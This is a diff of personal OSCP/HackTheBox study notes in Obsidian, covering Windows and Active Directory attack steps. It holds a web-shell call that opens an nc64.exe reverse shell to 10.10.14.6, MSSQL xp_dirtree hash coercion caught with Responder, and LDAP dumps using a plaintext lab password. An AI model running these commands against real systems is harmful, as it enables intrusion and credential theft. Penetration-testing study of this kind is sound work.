@@ -129,6 +129,29 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.6 443'
 ```
+
+Check for value files like lsass.zip
+
+---
+## Port 1433 MSSQL Database
+
+### Get Net-NTLMv2
+
+Try to get MSSQL to read a smb share off my KALI ATTACKER, which sends a hash that gets caught by responder listener
+
+Open Listener
+```
+sudo responder -I tun0
+```
+
+In MSSQL database query
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `EXEC xp_dirtree '\\\\${KaliIP}\\share', 1, 1`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 ---
 ## Port 5985 : Evil-WinRM
 
@@ -184,7 +207,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
-
 ### Same SVC password
 
 Sometimes the svc account guy has a personal account as well which he reuses the same password for
@@ -206,27 +228,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
-
-## Port 1433 MSSQL Database
-
-### Get Net-NTLMv2
-
-Try to get MSSQL to read a smb share off my KALI ATTACKER, which sends a hash that gets caught by responder listener
-
-Open Listener
-```
-sudo responder -I tun0
-```
-
-In MSSQL database query
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
-
-const command = `EXEC xp_dirtree '\\\\${KaliIP}\\share', 1, 1`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-
 ## Both User and PW Obtained : NetExec Credential Usage Sweep
 
 Upon Entry, Once Creds for unknown usage is obtained, use [[NetExec]]to check across all services, nxc-sweep is used to automatically check all services
@@ -288,9 +289,23 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 ## LDAP 389
 [[389 LDAP]]
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `ldapsearch -H ldap://${ip} -x -s base namingcontexts`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 Try to ping yourself with a listener opener, the printer might try to authenticate back to listener using the password accidentally
 
 Then try LDAP dump. There might be password and username
+
+Try adding in user and password for a further search
+
+```
+ldapsearch -H ldap://${ip} -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
+```
 
 ---
 
